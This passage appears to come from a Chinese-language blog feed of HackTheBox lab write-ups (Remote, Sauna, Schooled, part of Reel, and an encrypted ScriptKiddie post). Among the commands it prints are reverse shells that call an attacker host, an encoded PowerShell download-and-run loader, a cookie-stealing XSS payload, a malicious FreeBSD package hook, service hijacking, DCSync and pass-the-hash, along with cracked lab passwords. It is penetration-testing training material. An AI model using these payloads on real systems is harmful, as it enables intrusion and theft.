<p>在其他目录里发现了Outlook邮件文件</p>
<p><img src="/images/Reel/31.png" alt="31"></p>
<p>拷贝到kali上读取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ readpst Julia.ost              </span><br><span class="line">Opening PST file and indexes...</span><br><span class="line">Processing Folder &quot;Deleted Items&quot;</span><br><span class="line">Processing Folder &quot;Inbox&quot;</span><br><span class="line">Processing Folder &quot;Outbox&quot;</span><br><span class="line">Processing Folder &quot;Sent Items&quot;</span><br><span class="line">Processing Folder &quot;Calendar&quot;</span><br><span class="line">Processing Folder &quot;Contacts&quot;</span><br><span class="line">        &quot;Calendar&quot; - 0 items done, 4 items skipped.</span><br><span class="line">Processing Folder &quot;Conversation Action Settings&quot;</span><br><span class="line">        &quot;Sent Items&quot; - 2 items done, 0 items skipped.</span><br><span class="line">Processing Folder &quot;Drafts&quot;</span><br><span class="line">Processing Folder &quot;Journal&quot;</span><br><span class="line">Processing Folder &quot;Junk E-Mail&quot;</span><br><span class="line">        &quot;Contacts&quot; - 0 items done, 1 items skipped.</span><br><span class="line">Processing Folder &quot;Notes&quot;</span><br><span class="line">Processing Folder &quot;Tasks&quot;</span><br><span class="line">Processing Folder &quot;Sync Issues&quot;</span><br><span class="line">        &quot;Inbox&quot; - 3 items done, 10 items skipped.</span><br><span class="line">Processing Folder &quot;RSS Feeds&quot;</span><br><span class="line">Processing Folder &quot;Quick Step Settings&quot;</span><br><span class="line">        &quot;Julia.ost&quot; - 15 items done, 0 items skipped.</span><br><span class="line">Processing Folder &quot;Conflicts&quot;</span><br><span class="line">Processing Folder &quot;Local Failures&quot;</span><br><span class="line">Processing Folder &quot;Server Failures&quot;</span><br><span class="line">        &quot;Sync Issues&quot; - 3 items done, 0 items skipped.</span><br><span class="line"></span><br><span class="line">$ ls -l          </span><br><span class="line">total 16440</span><br><span class="line">-rw-r--r-- 1 root root     7287 May 30 22:57  Inbox.mbox</span><br><span class="line">-rwxr-xr-x 1 root root 16818176 May 30 22:56  Julia.ost</span><br><span class="line">-rw-r--r-- 1 root root     5335 May 30 22:57 &#39;Sent Items.mbox&#39;</span><br><span class="line"></span><br><span class="line">$ vim Inbox.mbox </span><br></pre></td></tr></table></figure>

<p>可以发现Julia的密码</p>
<p><img src="/images/Reel/32.png" alt="32"></p>
<p>以及解释了密码存在脚本内的原因</p>
<p><img src="/images/Reel/33.png" alt="33"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Remote</title>
    <url>/2020/10/28/HTB-Remote/</url>
    <content><![CDATA[<h1 id="Remote"><a href="#Remote" class="headerlink" title="Remote"></a>Remote</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Remote/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>手动检查21ftp，允许匿名登录，但是没有文件，不允许上传</p>
<p><img src="/images/Remote/2.png" alt="2"></p>
<p>smb不允许匿名登录，也不允许空登录，也不允许guest登录</p>
<p><img src="/images/Remote/3.png" alt="3"></p>
<p>NFS枚举</p>
<p><img src="/images/Remote/4.png" alt="4"></p>
<p>似乎是网站的备份文件，应该是很重要的信息了，但是没有写权限</p>
<p>再去检查80</p>
<p><img src="/images/Remote/5.png" alt="5"></p>
<p>得到Umbraco CMS</p>
<p>尝试目录枚举，第一次失败了，可能触发了什么安全机制<br>更换小一点的字典，降低线程数，可以完成枚举</p>
<p><img src="/images/Remote/6.png" alt="6"></p>
<p>之后得到登录页面</p>
<p><img src="/images/Remote/7.png" alt="7"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>nfs的目录是一个很好的突破点</p>
<p><img src="/images/Remote/8.png" alt="8"></p>
<p>找到了存在凭据的文件，文件不能直接读</p>
<p><img src="/images/Remote/9.png" alt="9"></p>
<p>通过strings，可以找到sha1的哈希</p>
<p><img src="/images/Remote/10.png" alt="10"></p>
<p>strings似乎并没有失去一些字符</p>
<p><img src="/images/Remote/11.png" alt="11"></p>
<p>破解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john hash --format&#x3D;Raw-SHA1 --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/Remote/12.png" alt="12"></p>
<p>凭据<code>admin@htb.local / baconandcheese</code>可以登录</p>
<p><img src="/images/Remote/13.png" alt="13"></p>
<p>在<code>Umbraco.sdf</code>中，似乎还发现了CMS版本</p>
<p><img src="/images/Remote/14.png" alt="14"></p>
<p>这样可以找到一个版本相同，且需要验证的漏洞</p>
<p><img src="/images/Remote/15.png" alt="15"></p>
<p>修改exp</p>
<p><img src="/images/Remote/16.png" alt="16"></p>
<p>如果<code>cmd /c</code>，否则RCE会失败</p>
<p><img src="/images/Remote/17.png" alt="17"></p>
<p>之后修改payload反弹powershell，注意转义</p>
<p><img src="/images/Remote/18.png" alt="18"></p>
<p>获得shell</p>
<p><img src="/images/Remote/19.png" alt="19"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>powerup不好使，会出错，winpeas可以</p>
<h3 id="Insecure-Service-Properties"><a href="#Insecure-Service-Properties" class="headerlink" title="Insecure Service Properties"></a>Insecure Service Properties</h3><p><img src="/images/Remote/20.png" alt="20"></p>
<p>生成shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter_reverse_tcp LHOST&#x3D;10.10.16.98 LPORT&#x3D;443 -f exe -o shell.exe</span><br></pre></td></tr></table></figure>

<p>注意powershell下得使用sc.exe查看服务，而不是sc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc.exe qc UsoSvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/Remote/21.png" alt="21"></p>
<p>修改路径</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc.exe config UsoSvc binpath&#x3D; &quot;C:\Users\Public\Downloads\shell.exe&quot;</span><br></pre></td></tr></table></figure>

<p>重启服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net stop UsoSvc</span><br><span class="line">net start UsoSvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/Remote/22.png" alt="22"></p>
<p>服务提权shell容易不稳定，最好migrate</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set AutoRunScript post&#x2F;windows&#x2F;manage&#x2F;migrate</span><br></pre></td></tr></table></figure>

<p>获得system</p>
<p><img src="/images/Remote/23.png" alt="23"></p>
<p>powershell反弹shell很稳定</p>
<p>先生成base64编码的反弹指令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;iex( IWR http:&#x2F;&#x2F;10.10.16.98&#x2F;winpriv&#x2F;Invoke-PowerShellTcp.ps1 -UseBasicParsing)&quot; | iconv -t UTF-16LE | base64 -w0</span><br></pre></td></tr></table></figure>

<p><code>cmd /c</code>比较重要，直接powershell会出错，用<code>-EncodedCommand</code>进行解码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc.exe config UsoSvc binpath&#x3D; &quot;cmd &#x2F;c powershell -EncodedCommand aQBlAHgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADYALgA5ADgALwB3AGkAbgBwAHIAaQB2AC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA&#x3D;&quot;</span><br><span class="line">net start UsoSvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/Remote/24.png" alt="24"></p>
<h3 id="SeImpersonatePrivilege"><a href="#SeImpersonatePrivilege" class="headerlink" title="SeImpersonatePrivilege"></a>SeImpersonatePrivilege</h3><p>考虑到目标版本比较新，使用roguepotato</p>
<p>这里需要指定CLSID，目标是<code>Windows Server 2019 Standard</code>，但是<code>Windows_10_Pro</code>和<code>Windows_10_Enterprise</code>某些CLSID仍然可用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\roguepotato.exe -r 10.10.16.98 -c &quot;&#123;B91D5831-B1BD-4608-8198-D72E155020F7&#125;&quot; -e &quot;cmd &#x2F;c powershell -EncodedCommand aQBlAHgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADYALgA5ADgALwB3AGkAbgBwAHIAaQB2AC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA&#x3D;&quot; -l 9999</span><br></pre></td></tr></table></figure>

<p><img src="/images/Remote/25.png" alt="25"></p>
<h3 id="CVE-2019-18988"><a href="#CVE-2019-18988" class="headerlink" title="CVE-2019-18988"></a>CVE-2019-18988</h3><p>进程找到TeamViewer7</p>
<p><img src="/images/Remote/26.png" alt="26"></p>
<p>枚举版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(Get-Command &quot;C:\Program Files (x86)\TeamViewer\Version7\TeamViewer.exe&quot;).version</span><br></pre></td></tr></table></figure>

<p><img src="/images/Remote/27.png" alt="27"></p>
<p>meterpreter有一个自动化提权:<a href="https://github.com/rapid7/metasploit-framework/pull/12900/files">https://github.com/rapid7/metasploit-framework/pull/12900/files</a></p>
<p><img src="/images/Remote/28.png" alt="28"></p>
<p>有了凭据就好办 ，对方5895开放，直接evil-winrm</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">evil-winrm -u administrator -p &#39;!R3m0te!&#39; -i 10.10.10.180</span><br></pre></td></tr></table></figure>

<p><img src="/images/Remote/29.png" alt="29"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Sauna</title>
    <url>/2021/05/22/HTB-Sauna/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Sauna/1.png" alt="1"></p>
<p>cme枚举445，可以到域名、机器名等信息，不过没有匿名共享</p>
<p><img src="/images/Sauna/2.png" alt="2"></p>
<p>80端口Web网页似乎是一个银行页面</p>
<p><img src="/images/Sauna/4.png" alt="4"></p>
<p>网页有输入点，但不接受POST请求</p>
<p><img src="/images/Sauna/3.png" alt="3"></p>
<p>LDAP枚举，没有什么有用的信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p 389 --script ldap-search 10.10.10.175</span><br><span class="line">ldapsearch -x -h 10.10.10.175 -s base namingcontexts</span><br><span class="line">ldapsearch -x -h 10.10.10.175 -b &#39;DC&#x3D;EGOTISTICAL-BANK,DC&#x3D;LOCAL&#39;</span><br></pre></td></tr></table></figure>

<p>80端口页面存在员工列表</p>
<p><img src="/images/Sauna/6.png" alt="6"></p>
<p>使用python，抓取下来并进行变形</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;[&#39;Fergus Smith&#39;,&#39;Shaun Coins&#39;,&#39;Sophie Driver&#39;,&#39;Bowie Taylor&#39;,&#39;Hugo Bear&#39;,&#39;Steven Kerb&#39;]</span><br><span class="line">for i in name:</span><br><span class="line">    firstname&#x3D;i.split()[0]</span><br><span class="line">    lastname&#x3D;i.split()[1]</span><br><span class="line">    print(firstname+lastname)</span><br><span class="line">    print(firstname)</span><br><span class="line">    print(lastname)</span><br><span class="line">    print(firstname[0]+lastname)</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FergusSmith</span><br><span class="line">Fergus</span><br><span class="line">Smith</span><br><span class="line">FSmith</span><br><span class="line">ShaunCoins</span><br><span class="line">Shaun</span><br><span class="line">Coins</span><br><span class="line">SCoins</span><br><span class="line">SophieDriver</span><br><span class="line">Sophie</span><br><span class="line">Driver</span><br><span class="line">SDriver</span><br><span class="line">BowieTaylor</span><br><span class="line">Bowie</span><br><span class="line">Taylor</span><br><span class="line">BTaylor</span><br><span class="line">HugoBear</span><br><span class="line">Hugo</span><br><span class="line">Bear</span><br><span class="line">HBear</span><br><span class="line">StevenKerb</span><br><span class="line">Steven</span><br><span class="line">Kerb</span><br><span class="line">SKerb</span><br></pre></td></tr></table></figure>

<p>kerberos枚举用户名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerbrute userenum -d EGOTISTICAL-BANK.LOCAL &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Usernames&#x2F;xato-net-10-million-usernames.txt --dc 10.10.10.175 -t 50</span><br></pre></td></tr></table></figure>

<p><img src="/images/Sauna/5.png" alt="5"></p>
<p>之后可以得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">administrator</span><br><span class="line">hsmith</span><br><span class="line">Administrator</span><br><span class="line">fsmith</span><br><span class="line">Fsmith</span><br><span class="line">sauna</span><br><span class="line">FSmith</span><br><span class="line">FSMITH</span><br></pre></td></tr></table></figure>

<p>使用刚刚生成的字典再次枚举，只得到了一个响应</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerbrute userenum -d EGOTISTICAL-BANK.LOCAL username.txt --dc 10.10.10.175 -t 50</span><br></pre></td></tr></table></figure>

<p><img src="/images/Sauna/7.png" alt="7"></p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>在获取用户名的情况下，我们进行AS_REP Roasting攻击，看是否有用户允许进行打开了<code>DONT_REQ_PREAUTH</code>，从而窃取AS_REP</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GetNPUsers.py egotistical-bank.local&#x2F;fsmith -request -no-pass -dc-ip 10.10.10.175</span><br></pre></td></tr></table></figure>

<p><img src="/images/Sauna/8.png" alt="8"></p>
<p>破解它，得到密码<code>Thestrokes23</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john hash --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/Sauna/9.png" alt="9"></p>
<p>之后就可以使用WinRM登录到机器上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23</span><br></pre></td></tr></table></figure>

<p><img src="/images/Sauna/10.png" alt="10"></p>
<h1 id="提取"><a href="#提取" class="headerlink" title="提取"></a>提取</h1><h2 id="USER-2"><a href="#USER-2" class="headerlink" title="USER 2"></a>USER 2</h2><p>手动枚举，发现了自动登录的凭据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Sauna/11.png" alt="11"></p>
<p>不过机器上并没有<code>svc_loanmanager</code>这个账户，有一个相似的用户名<code>svc_loanmgr</code></p>
<p><img src="/images/Sauna/12.png" alt="12"></p>
<p>使用凭据<code>svc_loanmgr/Moneymakestheworldgoround!</code>，成功登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.175 -u svc_loanmgr -p &#39;Moneymakestheworldgoround!&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Sauna/13.png" alt="13"></p>
<h2 id="SYSTEM"><a href="#SYSTEM" class="headerlink" title="SYSTEM"></a>SYSTEM</h2><p>通过BloodHound收集信息，发现了<code>svc_loanmgr</code>用户拥有对域的<code>GetChanges</code> 和 <code>GetChangesAll</code>权限</p>
<p><img src="/images/Sauna/14.png" alt="14"></p>
<p>这意味着我们可以对DC发起DCSync攻击，获取所有用户的哈希。平常习惯在域机器上使用mimikatz，不过这里<code>secretsdump.py</code>，它会使用135、445和高RPC端口进行通信</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secretsdump.py &#39;svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Sauna/15.png" alt="15"></p>
<p>获取哈希之后，可以直接PTH获取SYSTEM权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">psexec.py -hashes :d9485863c1e9e05851aa40cbb4ab9dff administrator@10.10.10.175</span><br></pre></td></tr></table></figure>

<p><img src="/images/Sauna/16.png" alt="16"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Schooled</title>
    <url>/2021/04/07/HTB-Schooled/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Schooled/1.png" alt="1"></p>
<p>以Web服务作为入口点，枚举80端口没有任何发现，对其进行子域名进行枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ffuf -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;DNS&#x2F;subdomains-top1million-5000.txt:FUZZ -u http:&#x2F;&#x2F;schooled.htb&#x2F; -H &#39;HOST: FUZZ.schooled.htb&#39; -c -fs 20750</span><br></pre></td></tr></table></figure>

<p><img src="/images/Schooled/2.png" alt="2"></p>
<p>发现moodle子域名，添加到hosts</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.234    schooled.htb moodle.schooled.htb</span><br></pre></td></tr></table></figure>

<p>moodle是一个使用PHP语言，开源学习平台管理系统</p>
<p><img src="/images/Schooled/9.png" alt="9"></p>
<p>可以发现提供了一些课程，随便注册一个普通账户先，注册的账户可以加入数学课程的学习</p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>首先加入课程的学习，寻找了一段时间后，在与老师的私聊页面里发现了XSS，但是老师没有触发</p>
<p>继续寻找，发现了一个公告板</p>
<p><img src="/images/Schooled/10.png" alt="10"></p>
<p>提示了教师Manuel Phillips会查看学生个人的profile信息，我们可以在这里插入XSS payload</p>
<p><img src="/images/Schooled/11.png" alt="11"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.write(&#39;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;10.10.16.8&#x2F;cookie.php?cookie&#x3D;&#39;+document.cookie+&#39;&quot; &#x2F;&gt;&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>之后等待老师访问</p>
<p><img src="/images/Schooled/3.png" alt="3"></p>
<p>窃取cookie，现在我们是老师</p>
<p>之后卡了一会儿，不过在链接，我得到了如何查看自己版本的方法</p>
<p>在进入课堂页面后，下面会弹出<code>Moodle Docs for this page</code>，点击后跳转至</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://docs.moodle.org/39/en/Course_homepage</span><br></pre></td></tr></table></figure>

<p>所以当前版本应该是3.9。知道版本后进行google，发现了CVE-2020-14321，可以让我们提升至管理权限</p>
<p>参考:<br><a href="https://www.youtube.com/watch?v=BkEInFI4oIU">https://www.youtube.com/watch?v=BkEInFI4oIU</a><br><a href="https://github.com/HoangKien1020/CVE-2020-14321">https://github.com/HoangKien1020/CVE-2020-14321</a></p>
<p>首先当前账户提升至管理权限，这个比较容易，用户id直接就可以从下面链接处获取，这表示我们可以提升任意账号，这里就提升当前这个老师就好了</p>
<p>id 24是当前教师，role 1表示manager</p>
<p><img src="/images/Schooled/12.png" alt="12"></p>
<p>刷新页面，现在我们是manager</p>
<p><img src="/images/Schooled/13.png" alt="13"></p>
<p>当我想尝试获得RCE执行的时候，发现Puillips这个账户虽然是Manager，但始终没有管理员控制台选项，这里卡了一会儿</p>
<p>后来发现，可以在当前课程添加Lianne Carter这个用户</p>
<p><img src="/images/Schooled/14.png" alt="14"></p>
<p>这也是个Manager权限用户</p>
<p><img src="/images/Schooled/15.png" alt="15"></p>
<p>现在可以切换到他</p>
<p><img src="/images/Schooled/16.png" alt="16"></p>
<p>管理员控制台出现</p>
<p><img src="/images/Schooled/17.png" alt="17"></p>
<p>顺着文章的RCE套路往下走就行，这里没有难度，之后webshell就可以被部署</p>
<p><img src="/images/Schooled/4.png" alt="4"></p>
<p>反弹即可</p>
<p><img src="/images/Schooled/5.png" alt="5"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>机器上找到了python，不在PATH中且没有X权限，没有获得TTY</p>
<h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>手动在config.php里找到mysql凭据</p>
<p><img src="/images/Schooled/18.png" alt="18"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -u moodle -pPlaybookMaster2020 -e &quot;use moodle;select * from mdl_user\G&quot;</span><br></pre></td></tr></table></figure>

<p>找到了Jamie的密码哈希，优先破解它，因为这个账户名也存在于/etc/passwd中</p>
<p><img src="/images/Schooled/19.png" alt="19"></p>
<p>破解得到</p>
<p><img src="/images/Schooled/6.png" alt="6"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh jamie@schooled.htb</span><br><span class="line">!QAZ2wsx</span><br></pre></td></tr></table></figure>

<p><img src="/images/Schooled/7.png" alt="20"></p>
<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>发现sudo权限</p>
<p><img src="/images/Schooled/20.png" alt="20"></p>
<p>这里思路比较明显，我们要自己创造一个FreeBSD下的pkg安装包</p>
<p>找到一篇文章: <a href="http://lastsummer.de/creating-custom-packages-on-freebsd/">http://lastsummer.de/creating-custom-packages-on-freebsd/</a></p>
<p>构造如下bash脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">STAGEDIR&#x3D;&#x2F;tmp&#x2F;package</span><br><span class="line">rm -rf $&#123;STAGEDIR&#125;</span><br><span class="line">mkdir -p $&#123;STAGEDIR&#125;</span><br><span class="line">cat &gt;&gt; $&#123;STAGEDIR&#125;&#x2F;+PRE_INSTALL &lt;&lt;EOF</span><br><span class="line"># careful here, this may clobber your system</span><br><span class="line">echo “Resetting root shell”</span><br><span class="line">rm &#x2F;tmp&#x2F;a;mkfifo &#x2F;tmp&#x2F;a;cat &#x2F;tmp&#x2F;a|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.16.16 4444 &gt;&#x2F;tmp&#x2F;a</span><br><span class="line">EOF</span><br><span class="line">cat &gt;&gt; $&#123;STAGEDIR&#125;&#x2F;+POST_INSTALL &lt;&lt;EOF</span><br><span class="line"># careful here, this may clobber your system</span><br><span class="line">echo “Registering root shell”</span><br><span class="line">pw usermod -n root -s &#x2F;bin&#x2F;sh</span><br><span class="line">EOF</span><br><span class="line">cat &gt;&gt; $&#123;STAGEDIR&#125;&#x2F;+MANIFEST &lt;&lt;EOF</span><br><span class="line">name: mypackage</span><br><span class="line">version: “1.0_5”</span><br><span class="line">origin: sysutils&#x2F;mypackage</span><br><span class="line">comment: “automates stuff”</span><br><span class="line">desc: “automates tasks which can also be undone later”</span><br><span class="line">maintainer: john@doe.it</span><br><span class="line">www: https:&#x2F;&#x2F;doe.it</span><br><span class="line">prefix: &#x2F;</span><br><span class="line">EOF</span><br><span class="line">pkg create -m $&#123;STAGEDIR&#125;&#x2F; -r $&#123;STAGEDIR&#125;&#x2F; -o .</span><br></pre></td></tr></table></figure>

<p>运行它生成package，之后sudo安装这个包即可，注意这里使用-U(–no-repo-update)参数取消从仓库中升级</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pkg install -U mypackage-“1.0_5”.txz</span><br></pre></td></tr></table></figure>

<p><img src="/images/Schooled/8.png" alt="8"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:ScriptKiddie</title>
    <url>/2021/02/08/HTB-ScriptKiddie/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="b7eb6b87b68e7e702e469ba577162048c8eb993fcc19c9eed8ee61be6e031816">6b83b1484c1bd4d3cb7f0b3881091a917e82162c1010b073de7b97f343becdb3711cf2fb7aff6959fd2e9b5c0d3d367d764be4bc55138d1e7549242a24096e939938285a1e1bf45689a869c0c3ffedf91156a33ca563286439974bd3452882de7553a8f774e6022c8738a070ff57bc422fe9d5e5d379549148b3c32c6aaa757bc72cb897b196e320aae53ca6ba3a06cf608b5121c3c654ef6cbb49fcd841964f2392569f667b57bf324cea45e4012e24875f675d0d3ff6fa91c520ab411e6d7af1e900e31edf61edfdae6e15708cbbc7f32970eb07a38cc07035001d70387114e097b9ae5e86098e047df6b8915934b615b6c73ff00d2ccbb5aa0c964417c03426950c19b80aefcefcac2f926111e5cea1906bcfb8953fab59f4313023fed28da30afb53906c8e0ed0943dbefb86e166d857bcb67a3056a8a909e39fabc08467244f2ab3c1b7a18023c12d40b3bd3ac494109af949b375fde6516a19b1d89c2db3f853435f11504d7f48c8229a09cc365057d8fd15c757ed280dfdb7e2711af191087a2f1562c391850049ab9c3b753ae8e95c1ef56b28abd8f96236e61fca13d9a9de6cb6dc7b25e29eb6b1363dbb8aff5e1e3bc48b691e6777df7d0dd9eb8d18f7682dc976933245d294c6bc866a2dc78602f0f68514fa3ccc72dea77bd33823beab8cd6a3cfd239a6d730a671eda8d5adadc6c53ecd4951c131571a376beeeb62ce422fb862b1367046c1b1ae81773c22c6ea22a803e63cdc1ede0ed915755b5c39b9fc5a6963e9028082f14ebf386753ddd9393fd279ad855f5dcd5bcab3d478166fc0cc1d1a13db91268c7f719dfd2f214a53dffe98b79c2e288aaecde95885f3a27bfb12ef9b41692e91225e127118df8f7539663cb39a073ef719e3b81b2797f94fec54572aa3d8ca4733ffedb12fe29ff1111fadf5d632fdfcb7b338362d7a38a265c06fd2893e53a441c79dcd7d0b78b00d7e4eebe24a2b092923701f998ef3b77f3aefc27360b0d757105665f0a5f5d6de8b29a401c4dbb00df7394050019a42988033bee0863779db369a00b597822497abbab5175284cf9bb2949a499c86cca21dfa11384ba571d94646b7a96729073b49755dd42288491f9f8867b1ea5502609fb76e6f2d4b26aceb13259d521b0f9587e5f966fde32856d852595b8b9a68ad52def85be9aae4b421f93ec6a1124ccd3096b8d2d4baafed08a6633fdfbfeaaa8a8968ab444a92a8bfd8652cd5e76d1c3d6e81e4d4b25466e068ce02c611161e61e6563a49396b9c3ae24af92876ea19d8bf52c0f50a643cd03510e155ca9d44eb35a7658f4202d5441ccb581a4272de52659a8bc0fc8c8639122fd7b52f2653e608f42be7d087239a4179b272906bd8bc86b2efc35eac710b8f44aa67e81fbe3ace74d7bf052b7d61efecec6b56619c2ecce85cb3f7ca1b31cab0b8e8e9ab7ff45539fb0c98d81f148947836fe59e75ef6241bda5cca94a0fafc506f7f6d996a5f8f1bc81f7a911643a6819cc5e966722875d31b904b391798a1d7d5e492869db3f19b2ee0b973392318c6a7ab24cdcef179a376d486025e8e2f6b058b727e7d96deb3a3bb2da9fcb91f017b41f373e338f7bdbfe40f44eabf41f48ea256c65d1b0d859562b8759dce660a0fc3918362f0107e0eeedb233b25fec8fd9fea0b147404e6a99879eab592be03e751de807b872553b339c9ef698f672e8f7e9c1b2105a57bda1660cf4c6d15b1dc7c0ab6839231bec562d4469b6c3e5efe6c2b1c7e703eca71ec7f33075d8a62c31a746be7657aef42c60bdd9f6d2219c437e716a0771f97388c4b61a9b2376163501dee242db87a9920228aa8e4983b78a0f163581560baa2952ce0eab4d196aaa4ea9cb65c296cb6918319a70f3d267ed00efdc28c05c8f480e4fc6d31581358d50c724758c4c6f55d96abd22f6caaf723f61946bacdd06f9cfb8f8ed5f2883ccc094fa6cfed852cd8a2395ae008510512fe92ca3de9f7c80fb1801eb78f00062e617e55a4d94827dccacebf652e85ed362d6d7c419b53311daf448889ffc4e0996cc2bef14d59b9b0026b0c9b443b89a838f8cb296240a9c112748bb3d425a6a60b9a93841ff3ee6dc1751fc98bf46911aecb1814242b7b69fd5fe8ef04be588f2c76d485a3a1bf088df118ebbc4fb5c5186fd35bca0b917f9be89205a9e72b5fdea8a4d27d6afc6fce6ae97013985df0cd28f21520ac6947bab3ed3b376253affa25b9445f3d5ce993f4cb8b325bc824e1ec045ac644ad9571dc785af2da739138913708a31a44c5a4808bb154073a2211ee1ca4afb5ea97dea2307be3197c8d7062b9aedc38dd7f1b528c76cea6e1126d0751ee2bb19c91dc6ec7917e5dc77ac2379aa76911918fa023b031adce2783c102dccaf0662f29afa771b8b68b2146611205e4f5f5c958b2b72c3dd37928f40b1acd7e6c944957aaf154d87151fa48478c9862dbafe0217c0edec20545e74523533d0f5446d7db67a8827a2607abfc49751e8d2bd79335162636165404a627be14a51112305ebd347f9bf5d032a5c0990fbb28de47793ea1056ef8f3f5993a60446db53cb3c3e584fc24448633afb47dad409315bb2589743b0fdb63bab7595bf9f342f8a4a06d776e42fbacfee38437c337007824c53188e64c16623a5d0f9f033b438574df949184951f2692fc522e88ecd5ca3a3c17f1958fea7cc29a65a1996647c37f2bd1cc0e7f6a7d236fb94294085edce6cbc86537fb3a7